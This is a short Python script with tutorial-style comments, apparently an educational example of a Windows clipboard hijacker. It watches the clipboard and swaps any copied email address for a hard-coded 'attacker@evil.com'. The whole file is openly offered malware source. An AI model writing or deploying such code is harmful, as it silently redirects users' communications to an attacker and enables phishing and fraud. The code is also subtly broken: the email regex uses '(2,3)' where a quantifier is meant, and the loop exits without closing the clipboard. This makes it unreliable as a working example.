# The goal of this particular python program is to look for
# cases where the user has an email address stored in their clipboard.
# We are going to scan the windows clipboard looking for times
# when that clipbaord contains just an email address.

import win32clipboard, re
from time import sleep # We use time because we don't need our code running constantly.

attacker_email = "attacker@evil.com"
emailregex = '^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w(2,3)$'

# we will replace the correct in the clipboard with the attacker email
# We using rstrip just to remove trailing whitespace from whatever we're copyinh.
while True:
    win32clipboard.OpenClipboard() # give access to the clipboard
    data = win32clipboard.GetClipboardData().rstrip() # we can read the contents of the clipboard
    print(data) 
    # re.search which allows us to use regular expressions to look for 
    # things that match this particular email
    if (re.search(emailregex,data)): # if the user has copied email to their clipbaord
        win32clipboard.EmptyClipboard(); # if yes, empty the clipboard and set the clipboard text to the attacker email.
        win32clipboard.SetClipboardText(attacker_email)
        break
    win32clipboard.CloseClipboard()
    sleep(1)
